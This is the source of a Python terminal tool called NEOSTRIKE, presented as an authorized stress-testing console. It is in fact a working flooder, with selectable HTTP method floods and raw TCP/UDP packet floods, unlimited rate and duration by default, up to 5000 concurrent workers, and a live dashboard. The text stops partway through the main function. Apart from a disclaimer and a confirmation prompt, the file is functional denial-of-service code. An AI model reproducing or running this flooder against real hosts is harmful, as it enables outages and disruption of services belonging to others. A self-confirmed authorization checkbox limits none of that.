#!/usr/bin/env python3
# =============================================================================
#  NEOSTRIKE  -  Authorized Load & Stress Testing Console
# =============================================================================
#
#  FOR AUTHORIZED TESTING ONLY - ON INFRASTRUCTURE YOU OWN OR HAVE EXPLICIT
#  WRITTEN PERMISSION TO TEST. Unauthorized use against systems you do not
#  control is illegal in most jurisdictions and unethical.
#
#  Install:  pip install -r requirements.txt
#  Run:      python neostrike.py
#  Requires: Python 3.10+
# =============================================================================

from __future__ import annotations

import asyncio
import logging
import os
import platform
import random
import re
import signal
import socket
import sys
import threading
import time
from collections import Counter, deque
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

# --- Third-party ------------------------------------------------------------
try:
    import aiohttp
except ImportError:  # pragma: no cover
    print("Missing dependency 'aiohttp'. Install with: pip install aiohttp")
    sys.exit(1)

try:
    from rich.align import Align
    from rich.console import Console, Group
    from rich.layout import Layout
    from rich.live import Live
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.table import Table
    from rich.text import Text
    from rich.theme import Theme
except ImportError:  # pragma: no cover
    print("Missing dependency 'rich'. Install with: pip install rich")
    sys.exit(1)


# =============================================================================
#  CONFIGURABLE DEFAULTS
#  ---------------------
#  Edit these constants to tune the tool's baseline behaviour. Every value here
#  is intentionally exposed so there are no "magic numbers" buried in the code.
# =============================================================================

# --- Concurrency / throughput -----------------------------------------------
DEFAULT_CONCURRENCY: int = 100          # Default number of in-flight workers
MAX_CONCURRENCY: int = 5000             # Hard upper bound to protect the host
DEFAULT_HTTP_METHOD: str = "GET"        # Pre-selected method at the prompt

# --- Timeouts (seconds) ------------------------------------------------------
REQUEST_TIMEOUT: float = 10.0           # Per-request total timeout (HTTP)
CONNECT_TIMEOUT: float = 5.0            # TCP connect timeout
TCP_UDP_TIMEOUT: float = 4.0            # Socket timeout for raw flood modes

# --- Rate limiting -----------------------------------------------------------
# Set REQUEST_RATE_CAP to a positive integer to cap requests/second globally.
# Set to 0 (or None) to disable rate limiting (full throttle).
REQUEST_RATE_CAP: Optional[int] = 0     # e.g. 500 = max 500 req/s; 0 = unlimited

# --- Payloads ----------------------------------------------------------------
DEFAULT_POST_BODY: str = '{"neostrike": "test"}'   # Body for POST/PUT
RAW_FLOOD_PAYLOAD_SIZE: int = 1024      # Bytes per packet in TCP/UDP flood
DEFAULT_USER_AGENT: str = "NEOSTRIKE/1.0 (+authorized-load-test)"

# --- Custom headers (always merged in; user headers override these) ----------
DEFAULT_HEADERS: dict[str, str] = {
    "User-Agent": DEFAULT_USER_AGENT,
    "Accept": "*/*",
    "Connection": "keep-alive",
}

# --- UI / refresh ------------------------------------------------------------
UI_REFRESH_PER_SEC: int = 12            # Live dashboard refresh rate
RECENT_FEED_SIZE: int = 12              # Number of live-feed lines retained
STATS_WINDOW_SECONDS: float = 5.0       # Sliding window for "current" req/s

# --- Logging -----------------------------------------------------------------
LOG_DIR: str = "neostrike_logs"         # Directory for structured log files
LOG_LEVEL: int = logging.INFO

# --- Theme palette (cyberpunk) -----------------------------------------------
NEON_CYAN = "#00f0ff"
ELECTRIC_PURPLE = "#b026ff"
HOT_PINK = "#ff2d95"
ACID_GREEN = "#39ff14"
WARN_AMBER = "#ffb000"
DEEP_BLACK = "#05060a"
DIM_GREY = "#5a6473"

THEME = Theme(
    {
        "ns.cyan": f"bold {NEON_CYAN}",
        "ns.purple": f"bold {ELECTRIC_PURPLE}",
        "ns.pink": f"bold {HOT_PINK}",
        "ns.green": f"bold {ACID_GREEN}",
        "ns.amber": f"bold {WARN_AMBER}",
        "ns.dim": DIM_GREY,
        "ns.label": f"bold {NEON_CYAN}",
        "ns.value": f"bold {HOT_PINK}",
        "ns.ok": f"bold {ACID_GREEN}",
        "ns.bad": f"bold {HOT_PINK}",
        "ns.warn": f"bold {WARN_AMBER}",
    }
)

console = Console(theme=THEME)


# =============================================================================
#  ASCII ART BANNER
# =============================================================================

BANNER = r"""
 ███▄    █ ▓█████  ▒█████    ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████
 ██ ▀█   █ ▓█   ▀ ▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀
▓██  ▀█ ██▒▒███   ▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███
▓██▒  ▐▌██▒▒▓█  ▄ ▒██   ██░  ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄
▒██░   ▓██░░▒████▒░ ████▓▒░▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ █▄░▒████▒
░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒ ▒▒ ▓▒░░ ▒░ ░
"""

SUBTITLE = "//  N E O S T R I K E   |  authorized stress-testing console  |  v1.0"


# =============================================================================
#  LOGGING SETUP
# =============================================================================

def setup_logger() -> tuple[logging.Logger, str]:
    """Create a timestamped structured log file and return (logger, path)."""
    os.makedirs(LOG_DIR, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = os.path.join(LOG_DIR, f"neostrike_{stamp}.log")

    logger = logging.getLogger("neostrike")
    logger.setLevel(LOG_LEVEL)
    logger.handlers.clear()

    fh = logging.FileHandler(log_path, encoding="utf-8")
    fmt = logging.Formatter(
        "%(asctime)s.%(msecs)03d | %(levelname)-7s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    fh.setFormatter(fmt)
    logger.addHandler(fh)
    logger.propagate = False
    return logger, log_path


# =============================================================================
#  CONFIGURATION DATACLASS
# =============================================================================

@dataclass
class TestConfig:
    target_raw: str
    host: str
    port: Optional[int]
    scheme: str
    url: str
    method: str                  # GET/POST/HEAD/PUT/DELETE  or  TCP/UDP
    headers: dict[str, str]
    concurrency: int
    duration_s: Optional[float]  # None = unlimited
    request_target: Optional[int]  # None = unlimited
    rate_cap: Optional[int]


# =============================================================================
#  SHARED STATS
# =============================================================================

@dataclass
class Stats:
    started_at: float = 0.0
    sent: int = 0
    completed: int = 0
    errors: int = 0
    bytes_recv: int = 0
    status_counts: Counter = field(default_factory=Counter)
    error_counts: Counter = field(default_factory=Counter)
    feed: deque = field(default_factory=lambda: deque(maxlen=RECENT_FEED_SIZE))
    window: deque = field(default_factory=lambda: deque(maxlen=20000))
    active: int = 0
    lock: threading.Lock = field(default_factory=threading.Lock)

    def record(self, ok: bool, code: str, nbytes: int = 0, note: str = "") -> None:
        with self.lock:
            self.completed += 1
            now = time.monotonic()
            self.window.append(now)
            if ok:
                self.status_counts[code] += 1
                self.bytes_recv += nbytes
            else:
                self.errors += 1
                self.error_counts[code] += 1
            if note:
                self.feed.append((now, ok, note))

    @property
    def elapsed(self) -> float:
        return time.monotonic() - self.started_at if self.started_at else 0.0

    def current_rps(self) -> float:
        now = time.monotonic()
        cutoff = now - STATS_WINDOW_SECONDS
        with self.lock:
            while self.window and self.window[0] < cutoff:
                self.window.popleft()
            return len(self.window) / STATS_WINDOW_SECONDS

    def avg_rps(self) -> float:
        e = self.elapsed
        return self.completed / e if e > 0 else 0.0


# =============================================================================
#  INPUT VALIDATION HELPERS
# =============================================================================

DURATION_RE = re.compile(r"^\s*(\d+)\s*([smhSMH]?)\s*$")


def parse_duration(text: str) -> Optional[float]:
    """Parse '30s', '5m', '1h', or plain seconds. Returns seconds or None."""
    if not text:
        return None
    m = DURATION_RE.match(text)
    if not m:
        raise ValueError(f"Invalid duration: '{text}'. Use e.g. 30s, 5m, 1h.")
    value = int(m.group(1))
    unit = (m.group(2) or "s").lower()
    mult = {"s": 1, "m": 60, "h": 3600}[unit]
    return float(value * mult)


def normalize_target(raw: str, method: str) -> tuple[str, Optional[int], str, str]:
    """
    Returns (host, port, scheme, url).
    Accepts forms like:
      example.com
      http://example.com:8080/path
      192.168.0.10:9000
    """
    raw = raw.strip()
    scheme = "http"
    host = raw
    port: Optional[int] = None
    path = ""

    if "://" in raw:
        scheme, rest = raw.split("://", 1)
        scheme = scheme.lower()
    else:
        rest = raw

    if "/" in rest:
        hostport, path = rest.split("/", 1)
        path = "/" + path
    else:
        hostport = rest

    if hostport.count(":") == 1:
        host, port_s = hostport.split(":", 1)
        if not port_s.isdigit():
            raise ValueError(f"Invalid port: '{port_s}'")
        port = int(port_s)
    else:
        host = hostport

    if not host:
        raise ValueError("Empty host.")

    if method in ("TCP", "UDP"):
        url = ""
        if port is None:
            raise ValueError("Raw TCP/UDP flood modes require a port (host:port).")
    else:
        if scheme not in ("http", "https"):
            scheme = "http"
        netloc = host if port is None else f"{host}:{port}"
        url = f"{scheme}://{netloc}{path or '/'}"

    return host, port, scheme, url


def resolve_host(host: str) -> str:
    """Resolve hostname to IP early to surface DNS errors before the storm."""
    try:
        return socket.gethostbyname(host)
    except socket.gaierror as exc:
        raise ValueError(f"DNS resolution failed for '{host}': {exc}") from exc


# =============================================================================
#  INTERACTIVE CONFIGURATION SEQUENCE
# =============================================================================

def show_disclaimer() -> bool:
    console.clear()
    banner_text = Text(BANNER, style="ns.purple")
    sub = Text(SUBTITLE, style="ns.cyan")
    console.print(Align.center(banner_text))
    console.print(Align.center(sub))
    console.print()

    warn_body = Text()
    warn_body.append("AUTHORIZED TESTING ONLY\n\n", style="ns.pink")
    warn_body.append(
        "This tool generates high-volume traffic and is intended SOLELY for "
        "stress-testing servers and infrastructure that YOU OWN or for which "
        "you hold EXPLICIT WRITTEN PERMISSION to test.\n\n",
        style="ns.amber",
    )
    warn_body.append(
        "Directing this traffic at systems you do not control may be illegal "
        "(e.g. computer-misuse / anti-DoS statutes) and is strictly against "
        "the intended use. You are solely responsible for your actions.",
        style="ns.dim",
    )
    console.print(
        Panel(
            warn_body,
            title="[ns.pink]!  DISCLAIMER  ![/]",
            border_style=HOT_PINK,
            padding=(1, 3),
        )
    )
    console.print()
    return Confirm.ask(
        "[ns.cyan]I confirm I am authorized to test the target[/]",
        default=False,
    )


def prompt_method() -> str:
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "TCP", "UDP"]
    table = Table(box=None, padding=(0, 2))
    table.add_column("#", style="ns.pink")
    table.add_column("Mode", style="ns.cyan")
    table.add_column("Description", style="ns.dim")
    desc = {
        "GET": "Standard HTTP GET flood",
        "POST": "HTTP POST with body payload",
        "HEAD": "Lightweight headers-only flood",
        "PUT": "HTTP PUT with body payload",
        "DELETE": "HTTP DELETE flood",
        "TCP": "Raw TCP connection/packet flood",
        "UDP": "Raw UDP packet flood",
    }
    for i, m in enumerate(methods, 1):
        table.add_row(str(i), m, desc[m])
    console.print(Panel(table, title="[ns.cyan]SELECT ATTACK MODE[/]",
                        border_style=ELECTRIC_PURPLE))

    default_idx = str(methods.index(DEFAULT_HTTP_METHOD) + 1)
    choice = Prompt.ask(
        "[ns.cyan]Mode #[/]",
        choices=[str(i) for i in range(1, len(methods) + 1)],
        default=default_idx,
    )
    return methods[int(choice) - 1]


def prompt_headers() -> dict[str, str]:
    headers: dict[str, str] = {}
    if not Confirm.ask("[ns.cyan]Add custom headers?[/]", default=False):
        return headers
    console.print("[ns.dim]Enter headers as 'Key: Value'. Blank line to finish.[/]")
    while True:
        line = Prompt.ask("[ns.pink]header[/]", default="")
        if not line.strip():
            break
        if ":" not in line:
            console.print("[ns.warn]  -> invalid format, expected 'Key: Value'[/]")
            continue
        k, v = line.split(":", 1)
        headers[k.strip()] = v.strip()
        console.print(f"[ns.green]  + {k.strip()} set[/]")
    return headers


def configure() -> Optional[TestConfig]:
    method = prompt_method()

    while True:
        target_raw = Prompt.ask(
            "[ns.cyan]Target URL or IP[/] [ns.dim](host, host:port, or full URL)[/]"
        )
        try:
            host, port, scheme, url = normalize_target(target_raw, method)
            ip = resolve_host(host)
            console.print(f"[ns.green]  + resolved {host} -> {ip}"
                          f"{(':' + str(port)) if port else ''}[/]")
            break
        except ValueError as exc:
            console.print(f"[ns.bad]  x {exc}[/]")

    headers = dict(DEFAULT_HEADERS)
    headers.update(prompt_headers())

    while True:
        try:
            conc = int(Prompt.ask("[ns.cyan]Concurrency level[/]",
                                  default=str(DEFAULT_CONCURRENCY)))
            if conc < 1:
                raise ValueError
            if conc > MAX_CONCURRENCY:
                console.print(f"[ns.warn]  -> capped to MAX_CONCURRENCY="
                              f"{MAX_CONCURRENCY}[/]")
                conc = MAX_CONCURRENCY
            break
        except ValueError:
            console.print("[ns.bad]  x enter a positive integer[/]")

    duration_s: Optional[float] = None
    while True:
        dtxt = Prompt.ask(
            "[ns.cyan]Duration[/] [ns.dim](e.g. 30s, 5m - blank = until stopped)[/]",
            default="",
        )
        try:
            duration_s = parse_duration(dtxt)
            break
        except ValueError as exc:
            console.print(f"[ns.bad]  x {exc}[/]")

    req_target: Optional[int] = None
    rtxt = Prompt.ask(
        "[ns.cyan]Request count target[/] [ns.dim](blank = unlimited)[/]",
        default="",
    )
    if rtxt.strip():
        try:
            req_target = int(rtxt)
            if req_target < 1:
                req_target = None
        except ValueError:
            console.print("[ns.warn]  -> invalid count, ignoring[/]")

    rate_cap = REQUEST_RATE_CAP if REQUEST_RATE_CAP else None

    cfg = TestConfig(
        target_raw=target_raw,
        host=host,
        port=port,
        scheme=scheme,
        url=url,
        method=method,
        headers=headers,
        concurrency=conc,
        duration_s=duration_s,
        request_target=req_target,
        rate_cap=rate_cap,
    )

    _print_config_review(cfg)
    if not Confirm.ask("[ns.pink]Launch flood now?[/]", default=True):
        return None
    return cfg


def _print_config_review(cfg: TestConfig) -> None:
    t = Table(box=None, padding=(0, 2))
    t.add_column("Parameter", style="ns.label")
    t.add_column("Value", style="ns.value")
    t.add_row("Target", cfg.url or f"{cfg.host}:{cfg.port}")
    t.add_row("Mode", cfg.method)
    t.add_row("Concurrency", str(cfg.concurrency))
    t.add_row("Duration", f"{cfg.duration_s:.0f}s" if cfg.duration_s else "inf (manual stop)")
    t.add_row("Request target", str(cfg.request_target) if cfg.request_target else "inf")
    t.add_row("Rate cap", f"{cfg.rate_cap}/s" if cfg.rate_cap else "unlimited")
    t.add_row("Custom headers", str(len(cfg.headers)))
    console.print(Panel(t, title="[ns.cyan]CONFIGURATION REVIEW[/]",
                        border_style=NEON_CYAN))


# =============================================================================
#  RATE LIMITER (token bucket)
# =============================================================================

class RateLimiter:
    def __init__(self, rate: Optional[int]):
        self.rate = rate
        self._tokens = float(rate) if rate else 0.0
        self._last = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self) -> None:
        if not self.rate:
            return
        async with self._lock:
            while True:
                now = time.monotonic()
                self._tokens += (now - self._last) * self.rate
                self._last = now
                if self._tokens > self.rate:
                    self._tokens = float(self.rate)
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return
                wait = (1.0 - self._tokens) / self.rate
                await asyncio.sleep(wait)


# =============================================================================
#  STOP CONTROLLER (Q key + Ctrl+C)
# =============================================================================

class StopController:
    def __init__(self):
        self.event = threading.Event()
        self._listener: Optional[threading.Thread] = None

    def request_stop(self) -> None:
        self.event.set()

    @property
    def stopped(self) -> bool:
        return self.event.is_set()

    def start_key_listener(self) -> None:
        """Listen for 'q' to stop. Best-effort, cross-platform."""
        self._listener = threading.Thread(target=self._listen, daemon=True)
        self._listener.start()

    def _listen(self) -> None:
        try:
            if platform.system() == "Windows":
                import msvcrt  # type: ignore
                while not self.stopped:
                    if msvcrt.kbhit():
                        ch = msvcrt.getch().decode(errors="ignore").lower()
                        if ch == "q":
                            self.request_stop()
                            return
                    time.sleep(0.05)
            else:
                import termios
                import tty
                import select
                fd = sys.stdin.fileno()
                old = termios.tcgetattr(fd)
                try:
                    tty.setcbreak(fd)
                    while not self.stopped:
                        r, _, _ = select.select([sys.stdin], [], [], 0.1)
                        if r:
                            ch = sys.stdin.read(1).lower()
                            if ch == "q":
                                self.request_stop()
                                return
                finally:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old)
        except Exception:
            # If raw input isn't available (e.g. piped stdin), Ctrl+C still works.
            return


# =============================================================================
#  WORKERS - HTTP (asyncio + aiohttp)  &  RAW TCP/UDP (threads)
# =============================================================================

async def http_worker(
    cfg: TestConfig,
    stats: Stats,
    stopper: StopController,
    limiter: RateLimiter,
    session: aiohttp.ClientSession,
    logger: logging.Logger,
) -> None:
    body = None
    if cfg.method in ("POST", "PUT"):
        body = DEFAULT_POST_BODY.encode()

    while not stopper.stopped:
        with stats.lock:
            if cfg.request_target and stats.sent >= cfg.request_target:
                return
            stats.sent += 1
            stats.active += 1

        await limiter.acquire()

        try:
            async with session.request(
                cfg.method, cfg.url, data=body, allow_redirects=False
            ) as resp:
                data = await resp.read()
                code = str(resp.status)
                ok = resp.status < 500
                stats.record(ok, code, len(data),
                             note=f"{cfg.method} -> {code} ({len(data)}B)")
                logger.info("REQ method=%s url=%s status=%s bytes=%d",
                            cfg.method, cfg.url, code, len(data))
        except asyncio.TimeoutError:
            stats.record(False, "TIMEOUT", note="timeout")
            logger.warning("REQ method=%s url=%s error=timeout", cfg.method, cfg.url)
        except aiohttp.ClientConnectorError as exc:
            stats.record(False, "CONN_ERR", note="conn-err")
            logger.error("REQ method=%s url=%s error=conn:%s", cfg.method, cfg.url, exc)
        except aiohttp.ClientError as exc:
            stats.record(False, "CLIENT_ERR", note="client-err")
            logger.error("REQ method=%s url=%s error=client:%s", cfg.method, cfg.url, exc)
        except Exception as exc:  # never crash the worker loop
            stats.record(False, "UNKNOWN", note="exception")
            logger.exception("REQ method=%s url=%s unexpected: %s",
                             cfg.method, cfg.url, exc)
        finally:
            with stats.lock:
                stats.active -= 1


def raw_worker(
    cfg: TestConfig,
    stats: Stats,
    stopper: StopController,
    logger: logging.Logger,
) -> None:
    """Raw TCP or UDP flood worker (runs in its own thread)."""
    payload = random.randbytes(RAW_FLOOD_PAYLOAD_SIZE)
    target = (resolve_host(cfg.host), int(cfg.port))

    while not stopper.stopped:
        with stats.lock:
            if cfg.request_target and stats.sent >= cfg.request_target:
                return
            stats.sent += 1
            stats.active += 1
        try:
            if cfg.method == "TCP":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(TCP_UDP_TIMEOUT)
                s.connect(target)
                s.sendall(payload)
                try:
                    s.recv(64)
                except socket.timeout:
                    pass
                s.close()
                stats.record(True, "TCP_OK", len(payload), note="TCP packet sent")
                logger.info("RAW proto=TCP target=%s:%s bytes=%d",
                            cfg.host, cfg.port, len(payload))
            else:  # UDP
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(TCP_UDP_TIMEOUT)
                s.sendto(payload, target)
                s.close()
                stats.record(True, "UDP_OK", len(payload), note="UDP packet sent")
                logger.info("RAW proto=UDP target=%s:%s bytes=%d",
                            cfg.host, cfg.port, len(payload))
        except socket.timeout:
            stats.record(False, "TIMEOUT", note="socket timeout")
            logger.warning("RAW proto=%s target=%s:%s error=timeout",
                           cfg.method, cfg.host, cfg.port)
        except (ConnectionRefusedError, OSError) as exc:
            stats.record(False, "CONN_ERR", note="conn-err")
            logger.error("RAW proto=%s target=%s:%s error=%s",
                         cfg.method, cfg.host, cfg.port, exc)
        except Exception as exc:
            stats.record(False, "UNKNOWN", note="exception")
            logger.exception("RAW unexpected: %s", exc)
        finally:
            with stats.lock:
                stats.active -= 1


# =============================================================================
#  DASHBOARD RENDERING
# =============================================================================

def make_layout() -> Layout:
    layout = Layout(name="root")
    layout.split_column(
        Layout(name="header", size=8),
        Layout(name="body", ratio=1),
        Layout(name="progress", size=4),
        Layout(name="footer", size=3),
    )
    layout["body"].split_row(
        Layout(name="left", ratio=1),
        Layout(name="center", ratio=1),
        Layout(name="right", ratio=1),
    )
    return layout


def render_header(cfg: TestConfig) -> Panel:
    art = Text(BANNER.strip("\n"), style="ns.purple")
    line = Text()
    line.append("  TARGET ", style="ns.label")
    line.append(f"{cfg.url or f'{cfg.host}:{cfg.port}'}", style="ns.value")
    line.append("    MODE ", style="ns.label")
    line.append(cfg.method, style="ns.pink")
    grp = Group(Align.center(art), Align.center(line))
    return Panel(grp, border_style=ELECTRIC_PURPLE, style=f"on {DEEP_BLACK}")


def render_telemetry(cfg: TestConfig, stats: Stats) -> Panel:
    cur = stats.current_rps()
    avg = stats.avg_rps()
    err_ratio = (stats.errors / stats.completed * 100) if stats.completed else 0.0
    load = min(100.0, err_ratio * 1.5 + (cfg.concurrency / MAX_CONCURRENCY) * 30
               + (1 if cur < avg * 0.6 and stats.completed > 50 else 0) * 30)

    t = Table.grid(padding=(0, 1))
    t.add_column(style="ns.label", justify="right")
    t.add_column(style="ns.value")
    t.add_row("Sent", f"{stats.sent:,}")
    t.add_row("Completed", f"{stats.completed:,}")
    t.add_row("Errors", f"[ns.bad]{stats.errors:,}[/]")
    t.add_row("Current r/s", f"[ns.green]{cur:,.1f}[/]")
    t.add_row("Average r/s", f"{avg:,.1f}")
    t.add_row("Active", f"{stats.active:,}")
    t.add_row("Data recv", _fmt_bytes(stats.bytes_recv))
    t.add_row("Elapsed", _fmt_time(stats.elapsed))
    t.add_row("Est. load", _load_bar(load))
    return Panel(t, title="[ns.cyan]TELEMETRY[/]", border_style=NEON_CYAN)


def render_responses(stats: Stats) -> Panel:
    t = Table(box=None, expand=True)
    t.add_column("Code", style="ns.cyan")
    t.add_column("Count", justify="right", style="ns.pink")
    with stats.lock:
        all_codes = list(stats.status_counts.items()) + list(stats.error_counts.items())
    if not all_codes:
        t.add_row("[ns.dim]-[/]", "[ns.dim]waiting[/]")
    else:
        for code, n in sorted(all_codes, key=lambda kv: -kv[1])[:14]:
            style = "ns.ok" if code.isdigit() and int(code) < 400 else "ns.bad"
            t.add_row(f"[{style}]{code}[/]", f"{n:,}")
    return Panel(t, title="[ns.cyan]RESPONSES[/]", border_style=HOT_PINK)


def render_feed(stats: Stats) -> Panel:
    lines = Text()
    with stats.lock:
        feed = list(stats.feed)
    if not feed:
        lines.append("awaiting traffic...", style="ns.dim")
    for ts, ok, note in reversed(feed):
        marker = ">" if ok else "x"
        style = "ns.green" if ok else "ns.bad"
        stamp = datetime.now().strftime("%H:%M:%S")
        lines.append(f"{marker} ", style=style)
        lines.append(f"[{stamp}] ", style="ns.dim")
        lines.append(f"{note}\n", style="ns.cyan" if ok else "ns.pink")
    return Panel(lines, title="[ns.cyan]LIVE FEED[/]", border_style=ELECTRIC_PURPLE)


def render_progress(cfg: TestConfig, stats: Stats) -> Panel:
    bars = Text()
    if cfg.duration_s:
        frac = min(1.0, stats.elapsed / cfg.duration_s)
        bars.append("Duration  ", style="ns.label")
        bars.append(_mini_bar(frac) + f"  {stats.elapsed:.0f}/{cfg.duration_s:.0f}s\n",
                    style="ns.cyan")
    if cfg.request_target:
        frac = min(1.0, stats.sent / cfg.request_target)
        bars.append("Requests  ", style="ns.label")
        bars.append(_mini_bar(frac) + f"  {stats.sent:,}/{cfg.request_target:,}\n",
                    style="ns.pink")
    if not cfg.duration_s and not cfg.request_target:
        bars.append("Running until manually stopped ", style="ns.amber")
        bars.append("[inf]", style="ns.pink")
    return Panel(bars, title="[ns.cyan]PROGRESS[/]", border_style=ACID_GREEN)


def render_footer() -> Panel:
    t = Text()
    t.append("  [Q]", style="ns.pink")
    t.append(" stop   ", style="ns.dim")
    t.append("[Ctrl+C]", style="ns.pink")
    t.append(" abort   ", style="ns.dim")
    t.append("NEOSTRIKE", style="ns.purple")
    t.append("  | authorized use only", style="ns.dim")
    return Panel(t, border_style=DIM_GREY)


def _mini_bar(frac: float, width: int = 28) -> str:
    filled = int(frac * width)
    return "#" * filled + "." * (width - filled)


def _load_bar(pct: float, width: int = 14) -> str:
    filled = int(pct / 100 * width)
    color = "ns.green" if pct < 40 else ("ns.amber" if pct < 75 else "ns.bad")
    bar = "#" * filled + "." * (width - filled)
    return f"[{color}]{bar} {pct:4.0f}%[/]"


def _fmt_bytes(n: int) -> str:
    x = float(n)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if x < 1024:
            return f"{x:.1f}{unit}"
        x /= 1024
    return f"{x:.1f}PB"


def _fmt_time(s: float) -> str:
    s = int(s)
    h, rem = divmod(s, 3600)
    m, sec = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{sec:02d}"


# =============================================================================
#  ORCHESTRATION
# =============================================================================

async def run_http_test(
    cfg: TestConfig, stats: Stats, stopper: StopController,
    logger: logging.Logger, live: Live, layout: Layout
) -> None:
    limiter = RateLimiter(cfg.rate_cap)
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
    connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False)

    async with aiohttp.ClientSession(
        timeout=timeout, connector=connector, headers=cfg.headers
    ) as session:
        workers = [
            asyncio.create_task(
                http_worker(cfg, stats, stopper, limiter, session, logger)
            )
            for _ in range(cfg.concurrency)
        ]
        await _drive_until_done(cfg, stats, stopper, live, layout)
        stopper.request_stop()
        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)


def run_raw_test(
    cfg: TestConfig, stats: Stats, stopper: StopController,
    logger: logging.Logger, live: Live, layout: Layout
) -> None:
    threads = [
        threading.Thread(target=raw_worker, args=(cfg, stats, stopper, logger),
                         daemon=True)
        for _ in range(cfg.concurrency)
    ]
    for th in threads:
        th.start()

    while not stopper.stopped:
        _refresh(cfg, stats, live, layout)
        if _limits_reached(cfg, stats):
            break
        time.sleep(1.0 / UI_REFRESH_PER_SEC)
    stopper.request_stop()
    for th in threads:
        th.join(timeout=2.0)


async def _drive_until_done(cfg, stats, stopper, live, layout) -> None:
    while not stopper.stopped:
        _refresh(cfg, stats, live, layout)
        if _limits_reached(cfg, stats):
            return
        await asyncio.sleep(1.0 / UI_REFRESH_PER_SEC)


def _limits_reached(cfg: TestConfig, stats: Stats) -> bool:
    if cfg.duration_s and stats.elapsed >= cfg.duration_s:
        return True
    if cfg.request_target and stats.sent >= cfg.request_target \
            and stats.active == 0:
        return True
    return False


def _refresh(cfg: TestConfig, stats: Stats, live: Live, layout: Layout) -> None:
    layout["header"].update(render_header(cfg))
    layout["left"].update(render_telemetry(cfg, stats))
    layout["center"].update(render_responses(stats))
    layout["right"].update(render_feed(stats))
    layout["progress"].update(render_progress(cfg, stats))
    layout["footer"].update(render_footer())
    live.refresh()


# =============================================================================
#  FINAL SUMMARY
# =============================================================================

def final_summary(cfg: TestConfig, stats: Stats, logger: logging.Logger,
                  log_path: str) -> None:
    elapsed = stats.elapsed
    avg = stats.avg_rps()
    success = stats.completed - stats.errors
    succ_pct = (success / stats.completed * 100) if stats.completed else 0.0

    t = Table(box=None, padding=(0, 2))
    t.add_column("Metric", style="ns.label")
    t.add_column("Result", style="ns.value")
    t.add_row("Target", cfg.url or f"{cfg.host}:{cfg.port}")
    t.add_row("Mode", cfg.method)
    t.add_row("Concurrency", str(cfg.concurrency))
    t.add_row("Duration", _fmt_time(elapsed))
    t.add_row("Requests sent", f"{stats.sent:,}")
    t.add_row("Completed", f"{stats.completed:,}")
    t.add_row("Successful", f"[ns.ok]{success:,}[/]")
    t.add_row("Errors", f"[ns.bad]{stats.errors:,}[/]")
    t.add_row("Success rate", f"{succ_pct:.1f}%")
    t.add_row("Avg throughput", f"{avg:,.1f} req/s")
    t.add_row("Data received", _fmt_bytes(stats.bytes_recv))

    codes = Table(box=None, padding=(0, 2))
    codes.add_column("Code", style="ns.cyan")
    codes.add_column("Count", style="ns.pink", justify="right")
    for code, n in sorted(
        list(stats.status_counts.items()) + list(stats.error_counts.items()),
        key=lambda kv: -kv[1],
    ):
        codes.add_row(code, f"{n:,}")

    console.print()
    console.print(Panel(t, title="[ns.pink]FINAL SUMMARY[/]",
                        border_style=HOT_PINK))
    if codes.row_count:
        console.print(Panel(codes, title="[ns.cyan]RESPONSE BREAKDOWN[/]",
                            border_style=NEON_CYAN))
    console.print(f"[ns.dim]Structured log written to:[/] [ns.cyan]{log_path}[/]")

    logger.info("=" * 60)
    logger.info("SESSION SUMMARY")
    logger.info("target=%s mode=%s concurrency=%d",
                cfg.url or f'{cfg.host}:{cfg.port}', cfg.method, cfg.concurrency)
    logger.info("duration=%.1fs sent=%d completed=%d success=%d errors=%d",
                elapsed, stats.sent, stats.completed, success, stats.errors)
    logger.info("avg_rps=%.2f success_rate=%.1f%% bytes=%d",
                avg, succ_pct, stats.bytes_recv)
    logger.info("status_codes=%s", dict(stats.status_counts))
    logger.info("errors=%s", dict(stats.error_counts))
    logger.info("=" * 60)


# =============================================================================
#  MAIN
# =============================================================================

def main() -> int:
    logger, log_path = setup_logger()
    logger.info("NEOSTRIKE session started | python=%s | platform=%s",
                platform.python_version(), platform.platform())

    if not show_disclaimer():
        console.print("[ns.amber]Authorization not confirmed. Exiting.[/]")
        logger.info("Authorization declined. Exiting.")
        return 0

    try:
        cfg = configure()
    except KeyboardInterrupt:
        console.print("\n[ns.amber]Configuration aborted.[/]")
        return 0

    if cfg is None:
        console.print("[ns.amber]Launch cancelled.[/]")
        logger.info("Launch cancelled by user.")
        return 0

    logger.info("CONFIG target=%s mode=%s concurrency=%d duration=%s "
                "req_target=%s rate_cap=%s headers=%s",
                cfg.url or f'{cfg.host}:{cfg.port}', cfg.method, cfg.concurrency,
                cfg.duration_s, cfg.request_target, cfg.rate_cap,
                list(cfg.headers.keys()))

    stats = Stats(started_at=time.monotonic())
    stopper = StopController()

    def _sigint(_sig, _frm):
        stopper.request_stop()
    signal.signal(signal.SIGINT, _sigint)

    stopper.start_key_listener()
    layout = make_layout()

    console.clear()
    try:
        with Live(layout, console=console, refresh_per_second=UI_REFRESH_PER_SEC,
